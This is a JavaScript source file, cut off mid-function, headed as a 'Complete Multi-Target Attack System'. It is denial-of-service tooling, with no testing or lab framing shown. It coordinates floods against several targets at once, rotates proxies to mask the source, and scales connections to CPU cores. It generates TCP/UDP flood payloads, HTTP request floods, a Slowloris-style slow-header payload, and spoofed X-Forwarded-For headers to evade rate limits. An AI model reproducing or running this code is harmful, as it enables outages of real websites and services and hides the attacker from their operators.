// worker/farmily.js - Complete Multi-Target Attack System
const fs = require('fs');
const net = require('net');
const dgram = require('dgram');
const dns = require('dns');
const crypto = require('crypto');
const os = require('os');
const { performance } = require('perf_hooks');
const url = require('url');
const { promisify } = require('util');
const EventEmitter = require('events');
const cluster = require('cluster');
const { Worker } = require('worker_threads');
const Colors = {
    GREEN: '\x1b[32m', RED: '\x1b[31m', YELLOW: '\x1b[33m', BLUE: '\x1b[34m',
    MAGENTA: '\x1b[35m', CYAN: '\x1b[36m', WHITE: '\x1b[37m', GRAY: '\x1b[90m',
    BRIGHT_RED: '\x1b[91m', BRIGHT_GREEN: '\x1b[92m', BRIGHT_YELLOW: '\x1b[93m',
    RESET: '\x1b[0m', BOLD: '\x1b[1m', DIM: '\x1b[2m'
};
class GlobalResourceManager extends EventEmitter {
    constructor() {
        super();
        if (GlobalResourceManager.instance) {
            return GlobalResourceManager.instance;
        }
        
        GlobalResourceManager.instance = this;
        
        this.totalConnections = 0;
        this.maxGlobalConnections = os.cpus().length * 1000; // Scale with CPU cores
        this.activeAttacks = new Map();
        this.sharedProxies = new Map();
        this.globalStats = {
            totalBandwidth: 0,
            totalRequests: 0,
            totalErrors: 0,
            startTime: Date.now(),
            activeTargets: new Set()
        };
        
        this.resourceLimits = {
            maxMemoryPercent: 85,
            maxCpuPercent: 90,
            maxConnections: this.maxGlobalConnections,
            maxThreadsPerAttack: Math.max(os.cpus().length * 4, 200)
        };
        
        this.monitoringInterval = null;
        this.startGlobalMonitoring();
    }

    static getInstance() {
        if (!GlobalResourceManager.instance) {
            new GlobalResourceManager();
        }
        return GlobalResourceManager.instance;
    }

    registerAttack(attackId, attack) {
        this.activeAttacks.set(attackId, attack);
        this.globalStats.activeTargets.add(attack.config.target);
        this.emit('attack-registered', { attackId, target: attack.config.target });
    }

    unregisterAttack(attackId) {
        const attack = this.activeAttacks.get(attackId);
        if (attack) {
            this.globalStats.activeTargets.delete(attack.config.target);
            this.activeAttacks.delete(attackId);
            this.emit('attack-unregistered', { attackId });
        }
    }

    allocateConnections(requestedConnections, attackId) {
        const availableConnections = this.maxGlobalConnections - this.totalConnections;
        const allocated = Math.min(requestedConnections, availableConnections);
        
        if (allocated > 0) {
            this.totalConnections += allocated;
            this.emit('connections-allocated', { attackId, allocated, total: this.totalConnections });
        }
        
        return allocated;
    }

    releaseConnections(connectionCount, attackId) {
        this.totalConnections = Math.max(0, this.totalConnections - connectionCount);
        this.emit('connections-released', { attackId, released: connectionCount, total: this.totalConnections });
    }

    updateGlobalStats(stats) {
        this.globalStats.totalBandwidth += stats.bandwidth || 0;
        this.globalStats.totalRequests += stats.requests || 0;
        this.globalStats.totalErrors += stats.errors || 0;
        this.emit('global-stats-updated', this.globalStats);
    }

    getGlobalStats() {
        const uptime = (Date.now() - this.globalStats.startTime) / 1000;
        return {
            ...this.globalStats,
            uptime,
            activeAttacks: this.activeAttacks.size,
            totalConnections: this.totalConnections,
            availableConnections: this.maxGlobalConnections - this.totalConnections,
            memoryUsage: process.memoryUsage(),
            resourceUtilization: {
                connections: (this.totalConnections / this.maxGlobalConnections * 100).toFixed(2) + '%',
                memory: (process.memoryUsage().heapUsed / process.memoryUsage().heapTotal * 100).toFixed(2) + '%'
            }
        };
    }

    getResourceLimits() {
        return { ...this.resourceLimits };
    }

    canAllocateResources(requestedThreads, requestedConnections) {
        const currentMemory = process.memoryUsage().heapUsed / process.memoryUsage().heapTotal * 100;
        const availableConnections = this.maxGlobalConnections - this.totalConnections;
        
        return {
            canProceed: currentMemory < this.resourceLimits.maxMemoryPercent && 
                       availableConnections >= requestedConnections &&
                       requestedThreads <= this.resourceLimits.maxThreadsPerAttack,
            reasons: {
                memory: currentMemory < this.resourceLimits.maxMemoryPercent,
                connections: availableConnections >= requestedConnections,
                threads: requestedThreads <= this.resourceLimits.maxThreadsPerAttack
            },
            available: {
                memory: this.resourceLimits.maxMemoryPercent - currentMemory,
                connections: availableConnections,
                maxThreads: this.resourceLimits.maxThreadsPerAttack
            }
        };
    }

    startGlobalMonitoring() {
        if (this.monitoringInterval) return;
        
        this.monitoringInterval = setInterval(() => {
            const stats = this.getGlobalStats();
            this.emit('global-monitoring-update', stats);
            this.adjustResourceLimits(stats);
        }, 2000);
    }

    adjustResourceLimits(stats) {
        const memoryPercent = stats.memoryUsage.heapUsed / stats.memoryUsage.heapTotal * 100;
        if (memoryPercent > 80) {
            this.maxGlobalConnections = Math.max(100, this.maxGlobalConnections * 0.9);
        } else if (memoryPercent < 50 && this.maxGlobalConnections < os.cpus().length * 1000) {
            this.maxGlobalConnections = Math.min(os.cpus().length * 1000, this.maxGlobalConnections * 1.1);
        }
    }

    stopGlobalMonitoring() {
        if (this.monitoringInterval) {
            clearInterval(this.monitoringInterval);
            this.monitoringInterval = null;
        }
    }

    cleanup() {
        this.stopGlobalMonitoring();
        this.activeAttacks.clear();
        this.sharedProxies.clear();
        this.totalConnections = 0;
    }
}
class Logger extends EventEmitter {
    constructor() {
        super();
        this.logLevel = process.env.LOG_LEVEL || 'info';
        this.logFile = null;
        this.logBuffer = [];
        this.maxBufferSize = 1000;
        
        this.levels = {
            debug: 0,
            info: 1,
            warn: 2,
            error: 3,
            critical: 4
        };
    }

    setLogFile(filePath) {
        this.logFile = filePath;
        this.info(`Logging to file: ${filePath}`);
    }

    shouldLog(level) {
        return this.levels[level] >= this.levels[this.logLevel];
    }

    formatMessage(message, level, attackId = null, targetId = null) {
        const timestamp = new Date().toISOString();
        const prefix = attackId ? `[${attackId}${targetId ? `/${targetId}` : ''}]` : '';
        return {
            timestamp,
            level: level.toUpperCase(),
            attackId,
            targetId,
            message,
            formatted: `${prefix}[${level.toUpperCase()} ${timestamp}] ${message}`
        };
    }

    log(message, level = 'info', color = Colors.GREEN, attackId = null, targetId = null) {
        if (!this.shouldLog(level)) return;
        
        const logEntry = this.formatMessage(message, level, attackId, targetId);
        
        // Console output
        console.log(`${color}${logEntry.formatted}${Colors.RESET}`);
        
        // File output
        if (this.logFile) {
            fs.appendFileSync(this.logFile, logEntry.formatted + '\n');
        }
        
        // Buffer for retrieval
        this.logBuffer.push(logEntry);
        if (this.logBuffer.length > this.maxBufferSize) {
            this.logBuffer.shift();
        }
        
        // Emit for external handling
        this.emit('log', logEntry);
    }

    debug(message, attackId = null, targetId = null) {
        this.log(message, 'debug', Colors.GRAY, attackId, targetId);
    }

    info(message, attackId = null, targetId = null) {
        this.log(message, 'info', Colors.GREEN, attackId, targetId);
    }

    warn(message, attackId = null, targetId = null) {
        this.log(message, 'warn', Colors.YELLOW, attackId, targetId);
    }

    error(message, attackId = null, targetId = null) {
        this.log(message, 'error', Colors.RED, attackId, targetId);
    }

    critical(message, attackId = null, targetId = null) {
        this.log(message, 'critical', Colors.BRIGHT_RED, attackId, targetId);
    }

    success(message, attackId = null, targetId = null) {
        this.log(message, 'info', Colors.BRIGHT_GREEN, attackId, targetId);
    }

    getRecentLogs(count = 100, attackId = null, level = null) {
        let logs = this.logBuffer.slice(-count);
        
        if (attackId) {
            logs = logs.filter(log => log.attackId === attackId);
        }
        
        if (level) {
            logs = logs.filter(log => log.level.toLowerCase() === level.toLowerCase());
        }
        
        return logs;
    }
}

// Multi-Target Statistics Manager
class MultiTargetStats extends EventEmitter {
    constructor() {
        super();
        this.targetStats = new Map();
        this.globalStats = {
            totalTargets: 0,
            totalRequests: 0,
            totalBytes: 0,
            totalErrors: 0,
            startTime: 0,
            endTime: 0
        };
        this.monitoringInterval = null;
    }

    initializeTarget(targetId, targetInfo) {
        this.targetStats.set(targetId, {
            targetId,
            target: targetInfo.target,
            startTime: performance.now(),
            endTime: 0,
            requests: 0,
            bytes: 0,
            errors: 0,
            successfulRequests: 0,
            failedRequests: 0,
            averageResponseTime: 0,
            responseTimeHistory: [],
            bandwidthHistory: [],
            errorTypes: new Map(),
            isActive: true
        });
        
        this.globalStats.totalTargets++;
        if (this.globalStats.startTime === 0) {
            this.globalStats.startTime = performance.now();
        }
    }

    updateTargetStats(targetId, update) {
        const stats = this.targetStats.get(targetId);
        if (!stats) return;

        // Update individual target stats
        if (update.requests) stats.requests += update.requests;
        if (update.bytes) stats.bytes += update.bytes;
        if (update.errors) stats.errors += update.errors;
        if (update.successful) stats.successfulRequests += update.successful;
        if (update.failed) stats.failedRequests += update.failed;
        
        if (update.responseTime) {
            stats.responseTimeHistory.push(update.responseTime);
            if (stats.responseTimeHistory.length > 1000) {
                stats.responseTimeHistory.shift();
            }
            stats.averageResponseTime = stats.responseTimeHistory.reduce((a, b) => a + b, 0) / stats.responseTimeHistory.length;
        }

        if (update.bandwidth) {
            stats.bandwidthHistory.push({
                timestamp: Date.now(),
                bandwidth: update.bandwidth
            });
            // Keep last 60 seconds
            const oneMinuteAgo = Date.now() - 60000;
            stats.bandwidthHistory = stats.bandwidthHistory.filter(b => b.timestamp > oneMinuteAgo);
        }

        if (update.errorType) {
            const count = stats.errorTypes.get(update.errorType) || 0;
            stats.errorTypes.set(update.errorType, count + 1);
        }

        // Update global stats
        if (update.requests) this.globalStats.totalRequests += update.requests;
        if (update.bytes) this.globalStats.totalBytes += update.bytes;
        if (update.errors) this.globalStats.totalErrors += update.errors;

        this.emit('target-stats-updated', { targetId, stats });
        this.emit('global-stats-updated', this.getGlobalSummary());
    }

    finalizeTarget(targetId) {
        const stats = this.targetStats.get(targetId);
        if (stats) {
            stats.endTime = performance.now();
            stats.isActive = false;
            this.emit('target-finalized', { targetId, stats });
        }
    }

    getCurrentBandwidth(targetId) {
        const stats = this.targetStats.get(targetId);
        if (!stats || stats.bandwidthHistory.length === 0) return 0;
        
        const recent = stats.bandwidthHistory.slice(-5);
        return recent.reduce((sum, record) => sum + record.bandwidth, 0) / recent.length;
    }

    getTargetSummary(targetId) {
        const stats = this.targetStats.get(targetId);
        if (!stats) return null;

        const duration = (stats.endTime || performance.now()) - stats.startTime;
        const durationSeconds = duration / 1000;

        return {
            targetId: stats.targetId,
            target: stats.target,
            duration: durationSeconds.toFixed(2),
            requestsPerSecond: durationSeconds > 0 ? (stats.requests / durationSeconds).toFixed(2) : 0,
            successRate: stats.requests > 0 ? ((stats.successfulRequests / stats.requests) * 100).toFixed(2) : 0,
            totalRequests: stats.requests,
            totalBytes: stats.bytes,
            totalBytesFormatted: this.formatBytes(stats.bytes),
            averageResponseTime: stats.averageResponseTime.toFixed(2),
            currentBandwidth: this.getCurrentBandwidth(targetId),
            currentBandwidthFormatted: this.formatBytes(this.getCurrentBandwidth(targetId)) + '/s',
            errorSummary: Object.fromEntries(stats.errorTypes),
            isActive: stats.isActive
        };
    }

    getGlobalSummary() {
        const activeTargets = Array.from(this.targetStats.values()).filter(s => s.isActive);
        const totalCurrentBandwidth = activeTargets.reduce((sum, stats) => sum + this.getCurrentBandwidth(stats.targetId), 0);
        
        const duration = (this.globalStats.endTime || performance.now()) - this.globalStats.startTime;
        const durationSeconds = duration / 1000;

        return {
            totalTargets: this.globalStats.totalTargets,
            activeTargets: activeTargets.length,
            totalRequests: this.globalStats.totalRequests,
            totalBytes: this.globalStats.totalBytes,
            totalBytesFormatted: this.formatBytes(this.globalStats.totalBytes),
            totalErrors: this.globalStats.totalErrors,
            duration: durationSeconds.toFixed(2),
            averageRequestsPerSecond: durationSeconds > 0 ? (this.globalStats.totalRequests / durationSeconds).toFixed(2) : 0,
            currentTotalBandwidth: totalCurrentBandwidth,
            currentTotalBandwidthFormatted: this.formatBytes(totalCurrentBandwidth) + '/s',
            targets: Array.from(this.targetStats.keys()).map(id => this.getTargetSummary(id))
        };
    }

    formatBytes(bytes) {
        const units = ['B', 'KB', 'MB', 'GB', 'TB'];
        let size = bytes;
        let unitIndex = 0;

        while (size >= 1024 && unitIndex < units.length - 1) {
            size /= 1024;
            unitIndex++;
        }

        return `${size.toFixed(2)} ${units[unitIndex]}`;
    }

    finalize() {
        this.globalStats.endTime = performance.now();
        Array.from(this.targetStats.keys()).forEach(targetId => {
            this.finalizeTarget(targetId);
        });
    }

    startRealTimeMonitoring() {
        if (this.monitoringInterval) return;
        
        this.monitoringInterval = setInterval(() => {
            this.emit('real-time-update', this.getGlobalSummary());
        }, 1000);
    }

    stopRealTimeMonitoring() {
        if (this.monitoringInterval) {
            clearInterval(this.monitoringInterval);
            this.monitoringInterval = null;
        }
    }
}

// Advanced Proxy Manager with rotation, validation, and performance tracking
class ProxyManager extends EventEmitter {
    constructor() {
        super();
        this.proxies = [];
        this.workingProxies = new Set();
        this.failedProxies = new Map(); // Map to track failure reasons and counts
        this.proxyPerformance = new Map(); // Track response times and success rates
        this.currentIndex = 0;
        this.rotationStrategy = 'round-robin'; // 'round-robin', 'random', 'performance-based'
        this.validationInProgress = new Set();
    }

    loadProxies(proxyList) {
        this.proxies = proxyList.map(proxy => this.parseProxy(proxy));
        this.workingProxies.clear();
        this.failedProxies.clear();
        this.proxyPerformance.clear();
        
        logger.info(`Loaded ${this.proxies.length} proxies`);
        this.emit('proxies-loaded', { total: this.proxies.length });
        
        // Start background validation
        this.validateProxiesInBackground();
    }

    parseProxy(proxyString) {
        const parts = proxyString.split(':');
        if (parts.length >= 2) {
            return {
                host: parts[0],
                port: parseInt(parts[1]),
                username: parts[2] || null,
                password: parts[3] || null,
                type: parts[4] || 'http', // http, socks4, socks5
                original: proxyString,
                id: crypto.createHash('md5').update(proxyString).digest('hex').substring(0, 8)
            };
        }
        throw new Error(`Invalid proxy format: ${proxyString}`);
    }

    async validateProxiesInBackground() {
        const validationPromises = this.proxies.map(proxy => this.validateProxy(proxy));
        const results = await Promise.allSettled(validationPromises);
        
        let working = 0;
        let failed = 0;
        
        results.forEach((result, index) => {
            if (result.status === 'fulfilled' && result.value) {
                working++;
            } else {
                failed++;
            }
        });
        
        logger.info(`Proxy validation complete: ${working} working, ${failed} failed`);
        this.emit('validation-complete', { working, failed, total: this.proxies.length });
    }

    async validateProxy(proxy) {
        if (this.validationInProgress.has(proxy.id)) {
            return false;
        }
        
        this.validationInProgress.add(proxy.id);
        
        try {
            const startTime = performance.now();
            
            // Simple validation - try to connect
            const socket = new net.Socket();
            socket.setTimeout(5000);
            
            const isValid = await new Promise((resolve) => {
                socket.connect(proxy.port, proxy.host, () => {
                    socket.destroy();
                    resolve(true);
                });
                
                socket.on('error', () => {
                    socket.destroy();
                    resolve(false);
                });
                
                socket.on('timeout', () => {
                    socket.destroy();
                    resolve(false);
                });
            });
            
            const responseTime = performance.now() - startTime;
            
            if (isValid) {
                this.markProxyWorking(proxy, responseTime);
                return true;
            } else {
                this.markProxyFailed(proxy, 'Connection failed');
                return false;
            }
            
        } catch (error) {
            this.markProxyFailed(proxy, error.message);
            return false;
        } finally {
            this.validationInProgress.delete(proxy.id);
        }
    }

    getNextProxy() {
        if (this.proxies.length === 0) return null;
        
        switch (this.rotationStrategy) {
            case 'random':
                return this.getRandomProxy();
            case 'performance-based':
                return this.getPerformanceBasedProxy();
            case 'round-robin':
            default:
                return this.getRoundRobinProxy();
        }
    }

    getRoundRobinProxy() {
        // Prefer working proxies
        const workingProxiesList = this.proxies.filter(p => 
            this.workingProxies.has(p.original) && !this.failedProxies.has(p.original)
        );
        
        if (workingProxiesList.length > 0) {
            const proxy = workingProxiesList[this.currentIndex % workingProxiesList.length];
            this.currentIndex = (this.currentIndex + 1) % workingProxiesList.length;
            return proxy;
        }
        
        // Fall back to all proxies
        const proxy = this.proxies[this.currentIndex % this.proxies.length];
        this.currentIndex = (this.currentIndex + 1) % this.proxies.length;
        return proxy;
    }

    getRandomProxy() {
        const workingProxiesList = this.proxies.filter(p => 
            this.workingProxies.has(p.original) && !this.failedProxies.has(p.original)
        );
        
        const sourceList = workingProxiesList.length > 0 ? workingProxiesList : this.proxies;
        return sourceList[Math.floor(Math.random() * sourceList.length)];
    }

    getPerformanceBasedProxy() {
        const workingProxiesList = this.proxies.filter(p => 
            this.workingProxies.has(p.original) && this.proxyPerformance.has(p.original)
        );
        
        if (workingProxiesList.length === 0) {
            return this.getRoundRobinProxy();
        }
        
        // Sort by performance (lower response time = better)
        workingProxiesList.sort((a, b) => {
            const perfA = this.proxyPerformance.get(a.original);
            const perfB = this.proxyPerformance.get(b.original);
            return perfA.averageResponseTime - perfB.averageResponseTime;
        });
        
        // Return one of the top 3 performers (randomized for load distribution)
        const topPerformers = workingProxiesList.slice(0, Math.min(3, workingProxiesList.length));
        return topPerformers[Math.floor(Math.random() * topPerformers.length)];
    }

    markProxyWorking(proxy, responseTime = 0) {
        this.workingProxies.add(proxy.original);
        this.failedProxies.delete(proxy.original);
        
        // Update performance tracking
        if (!this.proxyPerformance.has(proxy.original)) {
            this.proxyPerformance.set(proxy.original, {
                successCount: 0,
                failureCount: 0,
                responseTimes: [],
                averageResponseTime: 0
            });
        }
        
        const perf = this.proxyPerformance.get(proxy.original);
        perf.successCount++;
        
        if (responseTime > 0) {
            perf.responseTimes.push(responseTime);
            if (perf.responseTimes.length > 100) {
                perf.responseTimes.shift();
            }
            perf.averageResponseTime = perf.responseTimes.reduce((a, b) => a + b, 0) / perf.responseTimes.length;
        }
        
        this.emit('proxy-working', { proxy, responseTime });
    }

    markProxyFailed(proxy, reason = 'Unknown error') {
        this.failedProxies.set(proxy.original, {
            reason,
            timestamp: Date.now(),
            failureCount: (this.failedProxies.get(proxy.original)?.failureCount || 0) + 1
        });
        
        this.workingProxies.delete(proxy.original);
        
        // Update performance tracking
        if (this.proxyPerformance.has(proxy.original)) {
            this.proxyPerformance.get(proxy.original).failureCount++;
        }
        
        this.emit('proxy-failed', { proxy, reason });
    }

    getStats() {
        const performance = Array.from(this.proxyPerformance.entries()).map(([original, perf]) => ({
            proxy: original,
            successRate: perf.successCount / (perf.successCount + perf.failureCount) * 100,
            averageResponseTime: perf.averageResponseTime,
            totalRequests: perf.successCount + perf.failureCount
        }));
        
        return {
            total: this.proxies.length,
            working: this.workingProxies.size,
            failed: this.failedProxies.size,
            untested: this.proxies.length - this.workingProxies.size - this.failedProxies.size,
            rotationStrategy: this.rotationStrategy,
            performance: performance.sort((a, b) => b.successRate - a.successRate)
        };
    }

    setRotationStrategy(strategy) {
        if (['round-robin', 'random', 'performance-based'].includes(strategy)) {
            this.rotationStrategy = strategy;
            logger.info(`Proxy rotation strategy set to: ${strategy}`);
        }
    }
}

// Advanced Threading Manager with worker threads and clustering
class ThreadingManager extends EventEmitter {
    constructor() {
        super();
        this.workers = new Map();
        this.workerPool = [];
        this.maxWorkers = os.cpus().length * 2;
        this.activeWorkers = 0;
        this.taskQueue = [];
        this.workerStats = new Map();
        this.useWorkerThreads = false; // Enable for CPU-intensive tasks
    }

    async initializeWorkerPool(poolSize = this.maxWorkers) {
        if (!this.useWorkerThreads) return;
        
        logger.info(`Initializing worker thread pool with ${poolSize} workers`);
        
        for (let i = 0; i < poolSize; i++) {
            await this.createWorker();
        }
        
        logger.success(`Worker pool initialized with ${this.workerPool.length} workers`);
    }

    async createWorker() {
        if (!this.useWorkerThreads) return null;
        
        const workerId = crypto.randomUUID().substring(0, 8);
        
        // Note: In a real implementation, you'd create a separate worker script file
        // For now, we'll simulate worker functionality with regular threads
        const worker = {
            id: workerId,
            isAvailable: true,
            currentTask: null,
            stats: {
                tasksCompleted: 0,
                totalTime: 0,
                errors: 0
            }
        };
        
        this.workerPool.push(worker);
        this.workerStats.set(workerId, worker.stats);
        
        return worker;
    }

    getAvailableWorker() {
        return this.workerPool.find(worker => worker.isAvailable);
    }

    async executeTask(task, useWorker = false) {
        if (useWorker && this.useWorkerThreads) {
            return await this.executeWithWorker(task);
        } else {
            return await this.executeDirectly(task);
        }
    }

    async executeWithWorker(task) {
        const worker = this.getAvailableWorker();
        
        if (!worker) {
            // Queue the task if no workers available
            return new Promise((resolve, reject) => {
                this.taskQueue.push({ task, resolve, reject });
            });
        }
        
        worker.isAvailable = false;
        worker.currentTask = task;
        
        const startTime = performance.now();
        
        try {
            // Simulate worker execution
            const result = await this.executeDirectly(task);
            
            const executionTime = performance.now() - startTime;
            worker.stats.tasksCompleted++;
            worker.stats.totalTime += executionTime;
            
            this.emit('task-completed', { workerId: worker.id, executionTime, result });
            
            return result;
        } catch (error) {
            worker.stats.errors++;
            this.emit('task-failed', { workerId: worker.id, error });
            throw error;
        } finally {
            worker.isAvailable = true;
            worker.currentTask = null;
            
            // Process queued tasks
            if (this.taskQueue.length > 0) {
                const queued = this.taskQueue.shift();
                setImmediate(() => {
                    this.executeWithWorker(queued.task)
                        .then(queued.resolve)
                        .catch(queued.reject);
                });
            }
        }
    }

    async executeDirectly(task) {
        // Direct execution without worker threads
        return await task.execute();
    }

    getWorkerStats() {
        return {
            totalWorkers: this.workerPool.length,
            activeWorkers: this.workerPool.filter(w => !w.isAvailable).length,
            queuedTasks: this.taskQueue.length,
            workerPerformance: Array.from(this.workerStats.entries()).map(([id, stats]) => ({
                workerId: id,
                tasksCompleted: stats.tasksCompleted,
                averageTime: stats.tasksCompleted > 0 ? stats.totalTime / stats.tasksCompleted : 0,
                errorRate: stats.tasksCompleted > 0 ? (stats.errors / stats.tasksCompleted * 100).toFixed(2) + '%' : '0%'
            }))
        };
    }

    async shutdown() {
        logger.info('Shutting down threading manager...');
        
        // Wait for active tasks to complete
        while (this.workerPool.some(w => !w.isAvailable)) {
            await new Promise(resolve => setTimeout(resolve, 100));
        }
        
        this.workerPool = [];
        this.taskQueue = [];
        this.workerStats.clear();
        
        logger.success('Threading manager shutdown complete');
    }
}

// Multi-Target Attack Configuration
class MultiTargetConfig {
    constructor(options = {}) {
        this.targets = this.parseTargets(options.targets || []);
        this.method = options.method?.toUpperCase() || 'GET';
        this.layer = options.layer?.toUpperCase() || 'LAYER7';
        this.duration = options.duration || 60;
        this.threadsPerTarget = options.threadsPerTarget || Math.max(os.cpus().length, 10);
        this.maxConcurrentTargets = options.maxConcurrentTargets || 10;
        this.targetDelay = options.targetDelay || 0; // Delay between starting targets
        this.globalTimeout = options.globalTimeout || 5000;
        this.useProxies = options.useProxies || false;
        this.proxyList = options.proxyList || [];
        this.rotateProxiesPerTarget = options.rotateProxiesPerTarget || true;
        this.rampUpTime = options.rampUpTime || 0;
        this.coordinateTargets = options.coordinateTargets !== false;
        this.adaptiveScaling = options.adaptiveScaling !== false;
        this.resourceSharing = options.resourceSharing !== false;
        this.userAgents = options.userAgents || this.getDefaultUserAgents();
        this.payloadSize = options.payloadSize || 1024;
        this.randomizePayload = options.randomizePayload !== false;
        this.rateLimitBypass = options.rateLimitBypass || false;
        this.followRedirects = options.followRedirects || false;
        this.keepAlive = options.keepAlive || false;
    }

    parseTargets(targets) {
        if (typeof targets === 'string') {
            // Single target
            return [this.parseTarget(targets)];
        } else if (Array.isArray(targets)) {
            // Multiple targets
            return targets.map(target => this.parseTarget(target));
        } else {
            throw new Error('Targets must be a string or array of strings');
        }
    }

    parseTarget(target) {
        if (typeof target === 'string') {
            return {
                target: target,
                id: crypto.createHash('md5').update(target).digest('hex').substring(0, 8),
                weight: 1, // Equal weight by default
                priority: 1, // Equal priority by default
                customConfig: {}
            };
        } else if (typeof target === 'object') {
            return {
                target: target.target,
                id: target.id || crypto.createHash('md5').update(target.target).digest('hex').substring(0, 8),
                weight: target.weight || 1,
                priority: target.priority || 1,
                customConfig: target.config || {}
            };
        } else {
            throw new Error('Invalid target format');
        }
    }

    getDefaultUserAgents() {
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPad; CPU OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1'
        ];
    }

    validate() {
        if (!this.targets || this.targets.length === 0) {
            throw new Error('At least one target is required');
        }

        this.targets.forEach((target, index) => {
            if (!target.target) {
                throw new Error(`Target ${index} is missing target URL`);
            }
        });

        const validLayers = ['LAYER4', 'LAYER7'];
        if (!validLayers.includes(this.layer)) {
            throw new Error(`Invalid layer: ${this.layer}. Must be one of: ${validLayers.join(', ')}`);
        }

        const validMethods = {
            LAYER4: ['TCP', 'UDP'],
            LAYER7: ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS', 'SLOW']
        };

        if (!validMethods[this.layer].includes(this.method)) {
            throw new Error(`Invalid method ${this.method} for ${this.layer}`);
        }

        if (this.duration <= 0) throw new Error('Duration must be positive');
        if (this.threadsPerTarget <= 0) throw new Error('Threads per target must be positive');

        return true;
    }

    getTargetConfig(targetId) {
        const target = this.targets.find(t => t.id === targetId);
        return target ? {
            ...this,
            target: target.target,
            weight: target.weight,
            priority: target.priority,
            customConfig: target.customConfig
        } : null;
    }
}

// Advanced Utilities with multi-target support
class AdvancedUtils {
    static async resolveTargets(targets) {
        const dnsLookup = promisify(dns.lookup);
        const results = new Map();
        
        const resolvePromises = targets.map(async (target) => {
            try {
                const normalized = this.normalizeTarget(target.target);
                const hostname = normalized.hostname;

                // If it's already an IP address, return it
                if (/^(\d{1,3}\.){3}\d{1,3}$/.test(hostname)) {
                    results.set(target.id, { ...normalized, ip: hostname, resolved: true });
                    return;
                }

                // If it's localhost, return localhost
                if (hostname === 'localhost') {
                    results.set(target.id, { ...normalized, ip: 'localhost', resolved: true });
                    return;
                }

                // Try DNS lookup with timeout
                const address = await Promise.race([
                    dnsLookup(hostname),
                    new Promise((_, reject) => 
                        setTimeout(() => reject(new Error('DNS timeout')), 5000)
                    )
                ]);

                results.set(target.id, { ...normalized, ip: address.address, resolved: true });
                logger.debug(`Resolved ${hostname} to ${address.address}`, null, target.id);
            } catch (error) {
                logger.warn(`DNS resolution failed for ${target.target}: ${error.message}, using localhost`, null, target.id);
                const normalized = this.normalizeTarget(target.target);
                results.set(target.id, { ...normalized, ip: 'localhost', resolved: false });
            }
        });

        await Promise.allSettled(resolvePromises);
        return results;
    }

    static normalizeTarget(target) {
        // Ensure target has a protocol for URL parsing
        if (!target.startsWith('http://') && !target.startsWith('https://')) {
            target = `http://${target}`;
        }

        const parsedUrl = url.parse(target);
        const hostname = parsedUrl.hostname || 'localhost';
        const port = parsedUrl.port || '8000';

        return {
            hostname,
            port: parseInt(port),
            fullTarget: `${hostname}:${port}`,
            protocol: parsedUrl.protocol || 'http:',
            path: parsedUrl.path || '/'
        };
    }

    static generatePayload(type, target, config = {}) {
        const payloadSize = config.payloadSize || 1024;
        const randomize = config.randomizePayload !== false;
        
        switch(type.toUpperCase()) {
            case 'GET':
                return this.createHTTPPayload('GET', target, config);
            case 'POST':
                return this.createHTTPPayload('POST', target, config);
            case 'HEAD':
                return this.createHTTPPayload('HEAD', target, config);
            case 'PUT':
                return this.createHTTPPayload('PUT', target, config);
            case 'DELETE':
                return this.createHTTPPayload('DELETE', target, config);
            case 'OPTIONS':
                return this.createHTTPPayload('OPTIONS', target, config);
            case 'SLOW':
                return this.createSlowPayload(target, config);
            case 'TCP':
            case 'UDP':
                return randomize ? 
                    crypto.randomBytes(payloadSize) : 
                    Buffer.alloc(payloadSize, 'A');
            default:
                return crypto.randomBytes(payloadSize);
        }
    }

    static createHTTPPayload(method, target, config = {}) {
        const userAgent = this.getRandomUserAgent(config.userAgents);
        const normalizedTarget = this.normalizeTarget(target);
        
        let headers = [
            `${method} ${normalizedTarget.path} HTTP/1.1`,
            `Host: ${normalizedTarget.hostname}:${normalizedTarget.port}`,
            `User-Agent: ${userAgent}`,
            `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8`,
            `Accept-Language: en-US,en;q=0.5`,
            `Accept-Encoding: gzip, deflate`,
            `DNT: 1`,
            `Connection: ${config.keepAlive ? 'keep-alive' : 'close'}`,
            `Cache-Control: no-cache`
        ];

        // Add rate limit bypass headers
        if (config.rateLimitBypass) {
            headers.push(`X-Forwarded-For: ${this.randomIP()}`);
            headers.push(`X-Real-IP: ${this.randomIP()}`);
            headers.push(`X-Originating-IP: ${this.randomIP()}`);
            headers.push(`X-Remote-IP: ${this.randomIP()}`);
            headers.push(`X-Remote-Addr: ${this.randomIP()}`);
        }

        // Add body for POST/PUT methods
        let body = '';
        if (['POST', 'PUT'].includes(method)) {
            const data = config.randomizePayload ? 
                this.randomString(config.payloadSize || 256) : 
                'A'.repeat(config.payloadSize || 256);
            
            headers.push(`Content-Type: application/x-www-form-urlencoded`);
            headers.push(`Content-Length: ${data.length}`);
            body = data;
        }

        return Buffer.from(headers.join('\r\n') + '\r\n\r\n' + body);
    }

    static createSlowPayload(target, config = {}) {
        const userAgent = this.getRandomUserAgent(config.userAgents);
        const normalizedTarget = this.normalizeTarget(target);
        
        // Slowloris-style attack - incomplete headers
        const headers = [
            `GET ${normalizedTarget.path} HTTP/1.1`,
            `Host: ${normalizedTarget.hostname}:${normalizedTarget.port}`,
            `User-Agent: ${userAgent}`,
            `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8`,
            `Connection: keep-alive`,
            `Keep-Alive: timeout=1000, max=1000`,
            `X-a: ${this.randomString(16)}`
            // Intentionally incomplete - no final \r\n\r\n
        ];

        return Buffer.from(headers.join('\r\n') + '\r\n');
    }

    static randomString(length) {
